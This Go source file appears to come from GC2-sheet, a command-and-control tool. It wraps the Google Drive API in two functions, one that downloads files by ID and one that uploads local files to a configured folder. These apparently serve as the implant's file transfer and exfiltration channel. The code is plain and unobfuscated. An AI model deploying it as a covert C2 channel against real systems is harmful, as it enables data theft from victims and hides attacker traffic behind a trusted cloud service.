package C2

import (
	"GC2-sheet/internal/configuration"
	"google.golang.org/api/drive/v3"
	"io"
	"os"
)

type GoogleFileSystem struct {
	connector     *drive.Service
	googleDriveID string
}

func NewGoogleFileSystem(connector *GoogleConnector) *GoogleFileSystem {
	return &GoogleFileSystem{
		connector:     &connector.googleDriveConnector,
		googleDriveID: configuration.GetOptionsGoogleDriveID(),
	}
}

func (g *GoogleFileSystem) pullFile(fileId string) ([]byte, error) {

	resp, err := g.connector.Files.Get(fileId).Download()
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	fileDownloaded, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return fileDownloaded, nil
}

func (g *GoogleFileSystem) pushFile(fileName string, file *os.File) error {

	var parent []string
	driveFolderId := g.googleDriveID
	parent = append(parent, driveFolderId)

	f := &drive.File{
		Name:    fileName,
		DriveId: driveFolderId,
		Parents: parent,
	}

	_, err := g.connector.Files.Create(f).Media(file).Do()

	return err

}
